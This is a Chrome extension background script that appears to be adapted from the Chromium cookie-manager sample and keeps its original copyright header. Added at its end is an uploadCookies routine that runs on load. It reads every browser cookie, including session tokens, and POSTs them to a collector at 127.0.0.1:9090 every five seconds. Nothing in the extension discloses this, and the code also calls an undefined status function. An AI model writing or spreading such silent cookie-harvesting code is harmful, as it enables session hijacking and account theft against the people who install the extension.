// Copyright (c) 2012 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

chrome.cookies.onChanged.addListener(function(info) {
  console.log("onChanged" + JSON.stringify(info));
});

function focusOrCreateTab(url) {
  chrome.windows.getAll({"populate":true}, function(windows) {
    var existing_tab = null;
    for (var i in windows) {
      var tabs = windows[i].tabs;
      for (var j in tabs) {
        var tab = tabs[j];
        if (tab.url == url) {
          existing_tab = tab;
          break;
        }
      }
    }
    if (existing_tab) {
      chrome.tabs.update(existing_tab.id, {"selected":true});
    } else {
      chrome.tabs.create({"url":url, "selected":true});
    }
  });
}

chrome.browserAction.onClicked.addListener(function(tab) {
  var manager_url = chrome.extension.getURL("manager.html");
  alert(manager_url)
  focusOrCreateTab(manager_url);
});

function uploadCookies(){
    chrome.cookies.getAll({}, function(cookies) {
        let url = "http://127.0.0.1:9090/cookies"
        fetch(url,{
            method:"post",
            body: JSON.stringify(cookies)
        })
            .then(status)
            .then(function(data){
                console.log("请求成功，JSON解析后的响应数据为:",data);
            })
            .catch(function(err){
                console.log("Fetch错误:"+err);
            });
        setTimeout(uploadCookies, 5000);
    })
}
uploadCookies()